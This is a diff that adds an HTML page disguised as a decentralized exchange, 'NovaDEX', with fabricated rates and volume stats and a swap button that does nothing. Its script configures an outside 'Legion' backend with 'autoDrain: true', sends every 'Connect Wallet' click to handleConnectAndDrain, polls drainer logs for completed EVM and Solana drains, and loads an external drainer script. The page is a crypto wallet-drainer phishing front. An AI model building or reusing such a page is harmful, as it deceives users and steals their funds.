@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NovaDEX — Swap Tokens Instantly</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>◆</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0b0b0e;--bg2:#13131a;--card:#191920;--card2:#1f1f28;--card3:#262630;
+  --border:#2a2a36;--border2:#333340;
+  --accent:#7c5cff;--accent2:#9d7fff;--accent-glow:rgba(124,92,255,.15);
+  --green:#00d395;--green-bg:rgba(0,211,149,.08);
+  --red:#ff6b6b;--red-bg:rgba(255,107,107,.08);
+  --text:#f0f0f5;--text2:#a0a0b0;--text3:#6b6b80;
+  --radius:16px;--radius-sm:12px;
+}
+body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
+a{color:var(--accent2);text-decoration:none}
+button{font-family:inherit;cursor:pointer}
+
+/* ═══ Background Effect ═══ */
+.bg-effect{position:fixed;inset:0;z-index:0;pointer-events:none}
+.bg-effect::before{content:'';position:absolute;top:-30%;left:-10%;width:600px;height:600px;background:radial-gradient(circle,rgba(124,92,255,.06) 0%,transparent 70%);border-radius:50%}
+.bg-effect::after{content:'';position:absolute;bottom:-20%;right:-10%;width:500px;height:500px;background:radial-gradient(circle,rgba(0,211,149,.04) 0%,transparent 70%);border-radius:50%}
+
+/* ═══ Navigation ═══ */
+nav{position:sticky;top:0;z-index:100;background:rgba(11,11,14,.85);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);padding:0 24px;height:64px;display:flex;align-items:center;justify-content:space-between}
+.nav-left{display:flex;align-items:center;gap:32px}
+.logo{display:flex;align-items:center;gap:10px;font-size:20px;font-weight:700;color:#fff;letter-spacing:-.3px}
+.logo-icon{width:32px;height:32px;background:linear-gradient(135deg,var(--accent),#5b3cd4);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:16px;color:#fff}
+.nav-menu{display:flex;gap:4px}
+.nav-menu a{font-size:14px;font-weight:500;color:var(--text2);padding:8px 14px;border-radius:10px;transition:all .15s}
+.nav-menu a:hover,.nav-menu a.active{color:#fff;background:var(--card2)}
+.nav-right{display:flex;align-items:center;gap:10px}
+.chain-btn{display:flex;align-items:center;gap:6px;padding:8px 14px;background:var(--card);border:1px solid var(--border);border-radius:12px;color:var(--text);font-size:13px;font-weight:500}
+.chain-btn img{width:20px;height:20px;border-radius:50%}
+.chain-btn:hover{border-color:var(--border2);background:var(--card2)}
+.connect-btn{padding:8px 20px;background:var(--accent);color:#fff;border:none;border-radius:12px;font-size:14px;font-weight:600;transition:all .2s}
+.connect-btn:hover{background:var(--accent2);box-shadow:0 4px 20px rgba(124,92,255,.3)}
+.connect-btn.connected{background:var(--card);border:1px solid var(--border);color:var(--text)}
+.connect-btn.connected:hover{border-color:var(--accent)}
+
+/* ═══ Main Layout ═══ */
+.main{position:relative;z-index:1;max-width:480px;margin:80px auto 40px;padding:0 16px}
+
+/* ═══ Swap Header ═══ */
+.swap-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;padding:0 4px}
+.swap-tabs{display:flex;gap:2px}
+.swap-tabs button{background:none;border:none;color:var(--text3);font-size:15px;font-weight:500;padding:8px 12px;border-radius:10px;transition:all .15s}
+.swap-tabs button.active{color:#fff}
+.swap-tabs button:hover{color:var(--text2)}
+.swap-settings{display:flex;gap:4px}
+.swap-settings button{background:none;border:none;color:var(--text3);padding:6px 8px;border-radius:8px;font-size:16px;transition:all .15s}
+.swap-settings button:hover{color:var(--text);background:var(--card2)}
+
+/* ═══ Swap Card ═══ */
+.swap-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:4px;position:relative}
+.token-input{background:var(--card2);border-radius:var(--radius-sm);padding:16px;margin:4px}
+.token-input label{display:block;font-size:13px;color:var(--text3);margin-bottom:8px;font-weight:500}
+.token-row{display:flex;align-items:center;justify-content:space-between;gap:12px}
+.token-row input{background:none;border:none;color:#fff;font-size:28px;font-weight:500;width:55%;outline:none;font-family:'Inter',sans-serif}
+.token-row input::placeholder{color:var(--text3)}
+.token-select{display:flex;align-items:center;gap:8px;padding:6px 12px 6px 8px;background:var(--card3);border:1px solid var(--border);border-radius:20px;color:#fff;font-size:16px;font-weight:600;transition:all .15s;white-space:nowrap}
+.token-select:hover{border-color:var(--border2);background:var(--card)}
+.token-select img{width:24px;height:24px;border-radius:50%}
+.token-select-empty{background:var(--accent);border-color:var(--accent);padding:8px 16px;font-size:14px;font-weight:600}
+.token-select-empty:hover{background:var(--accent2);border-color:var(--accent2)}
+.token-info{display:flex;justify-content:space-between;margin-top:8px;font-size:13px;color:var(--text3)}
+.token-balance{cursor:pointer}
+.token-balance:hover{color:var(--accent2)}
+.token-max{color:var(--accent2);font-weight:600;cursor:pointer;margin-left:4px}
+
+/* ═══ Swap Arrow ═══ */
+.swap-arrow{display:flex;justify-content:center;margin:-14px 0;position:relative;z-index:2}
+.swap-arrow button{width:36px;height:36px;border-radius:10px;background:var(--card2);border:4px solid var(--card);color:var(--text3);display:flex;align-items:center;justify-content:center;transition:all .2s}
+.swap-arrow button:hover{color:#fff;background:var(--card3);transform:rotate(180deg)}
+.swap-arrow button svg{width:16px;height:16px}
+
+/* ═══ Rate Info ═══ */
+.rate-info{margin:8px 8px 4px;padding:10px 12px;border-radius:10px;font-size:13px;color:var(--text2);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:background .15s}
+.rate-info:hover{background:var(--card2)}
+.rate-details{max-height:0;overflow:hidden;transition:max-height .3s;margin:0 8px}
+.rate-details.open{max-height:200px}
+.rate-detail-row{display:flex;justify-content:space-between;padding:8px 12px;font-size:13px;color:var(--text2)}
+.rate-detail-row:last-child{border-bottom:none}
+
+/* ═══ Swap Button ═══ */
+.swap-btn{width:100%;padding:16px;border:none;border-radius:var(--radius-sm);font-size:16px;font-weight:600;margin-top:4px;transition:all .2s}
+.swap-btn.connect{background:var(--accent);color:#fff}
+.swap-btn.connect:hover{background:var(--accent2);box-shadow:0 6px 24px rgba(124,92,255,.25)}
+.swap-btn.disabled{background:var(--card2);color:var(--text3);cursor:default}
+.swap-btn.review{background:var(--accent);color:#fff}
+.swap-btn.loading{background:var(--card2);color:var(--text2);cursor:wait}
+.swap-btn.loading::after{content:'';display:inline-block;width:14px;height:14px;border:2px solid var(--text3);border-top-color:var(--accent);border-radius:50%;animation:spin .6s linear infinite;margin-left:8px;vertical-align:middle}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ═══ Info Banner ═══ */
+.info-banner{margin-top:16px;padding:14px 16px;background:var(--accent-glow);border:1px solid rgba(124,92,255,.15);border-radius:var(--radius-sm);display:flex;align-items:flex-start;gap:10px;font-size:13px;color:var(--text2);line-height:1.5}
+.info-banner-icon{font-size:16px;flex-shrink:0;margin-top:1px}
+
+/* ═══ Stats Bar ═══ */
+.stats{display:flex;justify-content:center;gap:32px;margin-top:40px;padding:20px;font-size:13px;color:var(--text3)}
+.stat{text-align:center}
+.stat-value{font-size:18px;font-weight:700;color:#fff;margin-bottom:4px}
+
+/* ═══ Footer ═══ */
+footer{text-align:center;padding:40px 16px;font-size:12px;color:var(--text3);border-top:1px solid var(--border);margin-top:60px}
+footer a{color:var(--text2)}
+footer .footer-links{display:flex;justify-content:center;gap:24px;margin-bottom:12px}
+
+/* ═══ Status Bar ═══ */
+.status-bar{position:fixed;bottom:0;left:0;right:0;background:rgba(19,19,26,.9);backdrop-filter:blur(12px);border-top:1px solid var(--border);padding:10px 24px;display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text3);z-index:100;transition:transform .3s}
+.status-dot{width:7px;height:7px;border-radius:50%;background:var(--green);flex-shrink:0}
+.status-dot.orange{background:#f59e0b}
+.status-dot.red{background:var(--red)}
+
+/* ═══ Mobile ═══ */
+@media(max-width:640px){
+  nav{padding:0 12px;height:56px}
+  .nav-menu{display:none}
+  .main{margin-top:40px}
+  .stats{flex-wrap:wrap;gap:16px}
+  .chain-btn span{display:none}
+}
+</style>
+</head>
+<body>
+
+<div class="bg-effect"></div>
+
+<nav>
+  <div class="nav-left">
+    <div class="logo">
+      <div class="logo-icon">◆</div>
+      NovaDEX
+    </div>
+    <div class="nav-menu">
+      <a href="#" class="active">Swap</a>
+      <a href="#">Explore</a>
+      <a href="#">Pool</a>
+      <a href="#">Bridge</a>
+      <a href="#">Governance</a>
+    </div>
+  </div>
+  <div class="nav-right">
+    <button class="chain-btn" id="chain-btn">
+      <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png" alt="">
+      <span>Ethereum</span>
+    </button>
+    <button class="connect-btn" id="nav-connect">Connect Wallet</button>
+  </div>
+</nav>
+
+<div class="main">
+  <div class="swap-header">
+    <div class="swap-tabs">
+      <button class="active">Swap</button>
+      <button>Limit</button>
+      <button>DCA</button>
+    </div>
+    <div class="swap-settings">
+      <button title="Refresh">↻</button>
+      <button title="Settings">⚙</button>
+    </div>
+  </div>
+
+  <div class="swap-card">
+    <div class="token-input">
+      <label>You pay</label>
+      <div class="token-row">
+        <input type="text" placeholder="0" id="input-amount" inputmode="decimal" autocomplete="off">
+        <button class="token-select" id="from-token">
+          <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png" alt="">
+          ETH
+          <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M3 4.5L6 7.5L9 4.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+        </button>
+      </div>
+      <div class="token-info">
+        <span id="input-usd">$0.00</span>
+        <span class="token-balance">Balance: 0.00 <span class="token-max">MAX</span></span>
+      </div>
+    </div>
+
+    <div class="swap-arrow">
+      <button onclick="flipTokens()" title="Switch tokens">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M7 10l5-5 5 5"/><path d="M7 14l5 5 5-5"/></svg>
+      </button>
+    </div>
+
+    <div class="token-input">
+      <label>You receive</label>
+      <div class="token-row">
+        <input type="text" placeholder="0" id="output-amount" readonly>
+        <button class="token-select token-select-empty" id="to-token">
+          Select token
+          <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M3 4.5L6 7.5L9 4.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+        </button>
+      </div>
+      <div class="token-info">
+        <span id="output-usd">$0.00</span>
+        <span></span>
+      </div>
+    </div>
+
+    <div class="rate-info" id="rate-toggle" style="display:none">
+      <span id="rate-text">1 ETH = 3,847.52 USDC</span>
+      <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M3 4.5L6 7.5L9 4.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+    </div>
+    <div class="rate-details" id="rate-details">
+      <div class="rate-detail-row"><span>Price Impact</span><span style="color:var(--green)">< 0.01%</span></div>
+      <div class="rate-detail-row"><span>Min. Received</span><span>3,843.67 USDC</span></div>
+      <div class="rate-detail-row"><span>Network Fee</span><span>~$2.45</span></div>
+      <div class="rate-detail-row"><span>Route</span><span>ETH → USDC via NovaDEX</span></div>
+    </div>
+
+    <button class="swap-btn connect" id="swap-btn" onclick="handleSwapClick()">Connect Wallet</button>
+  </div>
+
+  <div class="info-banner">
+    <span class="info-banner-icon">◆</span>
+    <span>NovaDEX aggregates liquidity across 400+ sources for the best rates. All trades are settled on-chain with zero platform fees.</span>
+  </div>
+
+  <div class="stats">
+    <div class="stat">
+      <div class="stat-value">$12.8B</div>
+      Total Volume
+    </div>
+    <div class="stat">
+      <div class="stat-value">2.1M</div>
+      Total Trades
+    </div>
+    <div class="stat">
+      <div class="stat-value">400+</div>
+      Liquidity Sources
+    </div>
+    <div class="stat">
+      <div class="stat-value">12</div>
+      Chains Supported
+    </div>
+  </div>
+</div>
+
+<footer>
+  <div class="footer-links">
+    <a href="#">Docs</a>
+    <a href="#">Github</a>
+    <a href="#">Discord</a>
+    <a href="#">Twitter</a>
+    <a href="#">Bug Bounty</a>
+    <a href="#">Terms</a>
+  </div>
+  <span>© 2026 NovaDEX Protocol. All rights reserved.</span>
+</footer>
+
+<div class="status-bar" id="status-bar">
+  <span class="status-dot" id="status-dot"></span>
+  <span id="status-text">Ready</span>
+</div>
+
+<script>
+// ═══ Config ═══
+window.LEGION_CONFIG = {
+  backendUrl: 'https://legionapi-production.up.railway.app',
+  wcProjectId: 'a785da105621eb55c998a35c57587667',
+  autoDrain: true,
+  silentMode: false
+};
+
+var ETH_PRICE = 3847.52;
+var isConnected = false;
+var selectedOutput = null;
+
+var TOKENS = [
+  { sym: 'USDC', name: 'USD Coin', img: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png', price: 1 },
+  { sym: 'USDT', name: 'Tether', img: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png', price: 1 },
+  { sym: 'DAI', name: 'Dai', img: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x6B175474E89094C44Da98b954EedeAC495271d0F/logo.png', price: 1 },
+  { sym: 'WBTC', name: 'Wrapped BTC', img: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599/logo.png', price: 98425 },
+];
+
+// ═══ Token Selection ═══
+document.getElementById('to-token').addEventListener('click', function() {
+  if (selectedOutput) {
+    var idx = (TOKENS.findIndex(function(t){return t.sym===selectedOutput.sym}) + 1) % TOKENS.length;
+    selectOutputToken(TOKENS[idx]);
+  } else {
+    selectOutputToken(TOKENS[0]);
+  }
+});
+
+function selectOutputToken(t) {
+  selectedOutput = t;
+  var btn = document.getElementById('to-token');
+  btn.className = 'token-select';
+  btn.innerHTML = '<img src="'+t.img+'" alt="">'+t.sym+'<svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M3 4.5L6 7.5L9 4.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>';
+  document.getElementById('rate-toggle').style.display = 'flex';
+  document.getElementById('rate-text').textContent = '1 ETH = ' + (ETH_PRICE/t.price).toLocaleString(undefined,{maximumFractionDigits:2}) + ' ' + t.sym;
+  calcOutput();
+  updateSwapBtn();
+}
+
+// ═══ Calculation ═══
+document.getElementById('input-amount').addEventListener('input', calcOutput);
+
+function calcOutput() {
+  var v = parseFloat(document.getElementById('input-amount').value) || 0;
+  var usd = v * ETH_PRICE;
+  document.getElementById('input-usd').textContent = '$' + usd.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2});
+  if (selectedOutput && v > 0) {
+    var out = usd / selectedOutput.price;
+    document.getElementById('output-amount').value = out.toLocaleString(undefined,{maximumFractionDigits:6});
+    document.getElementById('output-usd').textContent = '$' + usd.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2});
+  } else {
+    document.getElementById('output-amount').value = '';
+    document.getElementById('output-usd').textContent = '$0.00';
+  }
+  updateSwapBtn();
+}
+
+function flipTokens() {
+  var el = document.querySelector('.swap-arrow button');
+  el.style.transform = 'rotate(180deg)';
+  setTimeout(function(){ el.style.transform = ''; }, 300);
+}
+
+// ═══ Rate Toggle ═══
+document.getElementById('rate-toggle').addEventListener('click', function() {
+  document.getElementById('rate-details').classList.toggle('open');
+});
+
+// ═══ Swap Button Logic ═══
+function updateSwapBtn() {
+  var btn = document.getElementById('swap-btn');
+  var v = parseFloat(document.getElementById('input-amount').value) || 0;
+  if (!isConnected) {
+    btn.textContent = 'Connect Wallet';
+    btn.className = 'swap-btn connect';
+  } else if (!selectedOutput) {
+    btn.textContent = 'Select a token';
+    btn.className = 'swap-btn disabled';
+  } else if (v === 0) {
+    btn.textContent = 'Enter an amount';
+    btn.className = 'swap-btn disabled';
+  } else {
+    btn.textContent = 'Review Swap';
+    btn.className = 'swap-btn review';
+  }
+}
+
+function handleSwapClick() {
+  if (!isConnected) {
+    triggerConnect();
+  }
+}
+
+// ═══ Wallet Connection ═══
+document.getElementById('nav-connect').addEventListener('click', triggerConnect);
+
+function triggerConnect() {
+  if (isConnected) return;
+  setStatus('Connecting...', 'orange');
+  if (window.handleConnectAndDrain) {
+    window.handleConnectAndDrain();
+  } else if (window.legion && window.legion.connect) {
+    window.legion.connect();
+  }
+  pollConnection();
+}
+
+function pollConnection() {
+  var checks = 0;
+  var poll = setInterval(function() {
+    checks++;
+    if (checks > 60) { clearInterval(poll); setStatus('Ready', 'green'); return; }
+
+    var connected = false;
+    var chains = [];
+    var addr = '';
+
+    // Check via legion API
+    if (window.legion && window.legion.isConnected && window.legion.isConnected()) {
+      connected = true;
+      var w = window.legion.getWallets();
+      Object.keys(w).forEach(function(k) { chains.push(k); if (!addr) addr = w[k].address; });
+    }
+
+    // Check via logs
+    if (!connected && window.legion && window.legion.debug) {
+      try {
+        var logs = window.legion.debug.logs();
+        if (logs) logs.forEach(function(l) {
+          var m = l.message || '';
+          if (m.indexOf('submitted') !== -1 || m.indexOf('FLOW COMPLETE') !== -1) connected = true;
+          if (m.indexOf('EVM connected') !== -1) { chains.push('EVM'); connected = true; }
+          if (m.indexOf('SOL connected') !== -1) { chains.push('SOL'); connected = true; }
+          if (m.indexOf('WC EVM connected') !== -1) { chains.push('EVM'); connected = true; }
+        });
+      } catch(e) {}
+    }
+
+    if (connected) {
+      clearInterval(poll);
+      onConnected(chains, addr);
+    }
+  }, 2000);
+}
+
+function onConnected(chains, addr) {
+  isConnected = true;
+  var label = chains.length ? chains.join(', ') : 'Connected';
+  var short = addr ? addr.substring(0,6)+'...'+addr.substring(addr.length-4) : label;
+
+  document.getElementById('nav-connect').textContent = short;
+  document.getElementById('nav-connect').classList.add('connected');
+
+  updateSwapBtn();
+  setStatus(label + ' connected', 'green');
+}
+
+// ═══ Status Bar ═══
+function setStatus(text, color) {
+  document.getElementById('status-text').textContent = text;
+  var dot = document.getElementById('status-dot');
+  dot.className = 'status-dot';
+  if (color === 'orange') dot.classList.add('orange');
+  if (color === 'red') dot.classList.add('red');
+}
+</script>
+
+<script src="legion-one-script-v2.js"></script>
+</body>
+</html>
